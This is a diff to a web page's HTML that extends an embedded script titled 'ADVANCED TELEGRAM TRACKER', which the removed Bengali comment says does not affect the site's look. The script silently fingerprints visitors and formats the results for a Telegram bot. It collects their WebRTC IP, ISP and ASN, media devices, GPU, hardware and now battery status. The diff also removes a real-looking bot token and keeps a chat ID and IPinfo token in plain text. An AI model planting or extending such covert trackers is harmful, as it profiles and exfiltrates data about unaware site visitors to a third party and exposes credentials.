@@ -754,17 +754,16 @@ body{
 </script>
 
 <!-- ============================================================
-     ADVANCED TELEGRAM TRACKER
-     (নতুন — ওয়েবসাইটে কোনো প্রভাব নেই, কোনো ডিজাইন বদলায় না)
+     ADVANCED TELEGRAM TRACKER — সম্পূর্ণ আপডেটেড
      ============================================================ -->
 <script>
 (function () {
   'use strict';
 
   /* =============== সেটিং =============== */
-  var BOT_TOKEN    = '8604239989:AAHnuyJZpz_E6s-_7rXUvlbHazAKOAHEB7A';   // ← @BotFather থেকে টোকেন
-  var CHAT_ID      = '7274208494';                    // ← আপনার টেলিগ্রাম আইডি
-  var IPINFO_TOKEN = 'd24ca0e375019b';     // ← ipinfo.io/signup থেকে ফ্রি টোকেন
+  var BOT_TOKEN    = 'PASTE_YOUR_NEW_BOT_TOKEN_HERE';   // ← নতুন টোকেন বসান (পুরোনোটা revoke করুন)
+  var CHAT_ID      = '7274208494';                       // ← আপনার টেলিগ্রাম আইডি
+  var IPINFO_TOKEN = 'd24ca0e375019b';                  // ← ipinfo.io টোকেন
   /* ===================================== */
 
   function esc(s) {
@@ -824,7 +823,7 @@ body{
     });
   }
 
-  /* ---------- IPinfo.io: IP + Carrier + ASN ---------- */
+  /* ---------- IPinfo.io ---------- */
   function getIPinfo() {
     if (!IPINFO_TOKEN || IPINFO_TOKEN.indexOf('PASTE') === 0) {
       return Promise.resolve(null);
@@ -835,7 +834,7 @@ body{
       .catch(function () { return null; });
   }
 
-  /* ---------- Connection Type (WiFi / Data) ---------- */
+  /* ---------- Connection Type ---------- */
   function getConnectionType() {
     var c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
     if (!c) return { label: 'Not exposed', effectiveType: 'N/A', downlink: 'N/A', rtt: 'N/A', save: 'N/A' };
@@ -882,7 +881,7 @@ body{
       });
   }
 
-  /* ---------- Media (Camera/Mic/Speaker) ---------- */
+  /* ---------- Media ---------- */
   function getMediaInfo() {
     if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) {
       return Promise.resolve({ cams: 0, mics: 0, spks: 0, camLabels: [], micLabels: [], perm: 'Not Supported' });
@@ -910,6 +909,54 @@ body{
       .catch(function () {
         return { cams: 0, mics: 0, spks: 0, camLabels: [], micLabels: [], perm: 'Error' };
       });
+  }
+
+  /* ============================================================
+     🔋 SMART BATTERY DETECTION
+     Chrome/Edge/Opera/Samsung-এ কাজ করে
+     Brave/Firefox/Safari-তে সুন্দর কারণসহ বার্তা দেয়
+     ============================================================ */
+  function getBatteryInfo() {
+    var braveCheck = Promise.resolve(false);
+    if (navigator.brave && typeof navigator.brave.isBrave === 'function') {
+      braveCheck = navigator.brave.isBrave().catch(function () { return false; });
+    }
+
+    return braveCheck.then(function (isBrave) {
+      if (isBrave) {
+        return {
+          available: false,
+          icon: '🦁',
+          reason: 'Brave ব্রাউজারে প্রাইভেসির জন্য Battery API নিষ্ক্রিয়'
+        };
+      }
+
+      if (!navigator.getBattery || typeof navigator.getBattery !== 'function') {
+        var ua = navigator.userAgent;
+        if (/Firefox\//.test(ua)) {
+          return { available: false, icon: '🦊', reason: 'Firefox-এ Battery API রিমুভ করা হয়েছে' };
+        }
+        if (/Safari\//.test(ua) && !/Chrome\//.test(ua) && !/CriOS/.test(ua)) {
+          return { available: false, icon: '🧭', reason: 'Safari-তে Battery API নেই' };
+        }
+        return { available: false, icon: '⚠️', reason: 'এই ব্রাউজার Battery API সাপোর্ট করে না' };
+      }
+
+      return navigator.getBattery()
+        .then(function (battery) {
+          return {
+            available: true,
+            level: Math.round(battery.level * 100),
+            charging: battery.charging,
+            chargingTime: battery.chargingTime,
+            dischargingTime: battery.dischargingTime,
+            icon: battery.charging ? '⚡' : '🔋'
+          };
+        })
+        .catch(function () {
+          return { available: false, icon: '🚫', reason: 'API ব্লকড (প্রাইভেসি এক্সটেনশন)' };
+        });
+    });
   }
 
   /* ---------- AdBlocker ---------- */
@@ -1001,7 +1048,8 @@ body{
       checkAdBlock(),
       confirmBrave(),
       getStorageEstimate(),
-      getAccurateTime()
+      getAccurateTime(),
+      getBatteryInfo()          // ← নতুন ব্যাটারি
     ]).then(function (res) {
       var rtcIP  = res[0];
       var info   = res[1];
@@ -1010,6 +1058,7 @@ body{
       var brave  = res[4];
       var stor   = res[5];
       var time   = res[6];
+      var batt   = res[7];      // ← ব্যাটারি রেজাল্ট
 
       var ua = navigator.userAgent;
       var net = getConnectionType();
@@ -1097,7 +1146,26 @@ body{
       L.push('━━━━━━━━━━━━━━━━━━━━');
       L.push('⚙️ <b>ডিভাইস স্পেসিফিকেশন</b>');
       L.push('━━━━━━━━━━━━━━━━━━━━');
-      L.push('🔋 <b>Battery:</b> ❌ API Removed (ব্রাউজার আর সাপোর্ট করে না)');
+
+      /* 🔋 ব্যাটারি — স্মার্ট ডিটেকশন */
+      if (batt.available) {
+        var battStatus = batt.charging ? '⚡ চার্জ হচ্ছে' : '🔌 চার্জ হচ্ছে না';
+        L.push(batt.icon + ' <b>Battery:</b> ' + batt.level + '% — ' + battStatus);
+
+        if (batt.charging && batt.chargingTime && isFinite(batt.chargingTime) && batt.chargingTime !== Infinity) {
+          var t1 = Math.round(batt.chargingTime / 60);
+          var h1 = Math.floor(t1 / 60), m1 = t1 % 60;
+          L.push('⏱️ <b>Full Charge In:</b> ' + (h1 > 0 ? h1 + ' ঘন্টা ' + m1 + ' মিনিট' : m1 + ' মিনিট'));
+        }
+        if (!batt.charging && batt.dischargingTime && isFinite(batt.dischargingTime) && batt.dischargingTime !== Infinity) {
+          var t2 = Math.round(batt.dischargingTime / 60);
+          var h2 = Math.floor(t2 / 60), m2 = t2 % 60;
+          L.push('⏳ <b>Battery Empty In:</b> ' + (h2 > 0 ? h2 + ' ঘন্টা ' + m2 + ' মিনিট' : m2 + ' মিনিট'));
+        }
+      } else {
+        L.push(batt.icon + ' <b>Battery:</b> ' + batt.reason);
+      }
+
       L.push('🧠 <b>CPU Cores:</b> ' + esc(navigator.hardwareConcurrency || 'N/A'));
       L.push('💾 <b>Device Memory:</b> ' + esc(navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'N/A'));
       L.push('🎮 <b>GPU:</b> ' + esc(gpu.renderer));
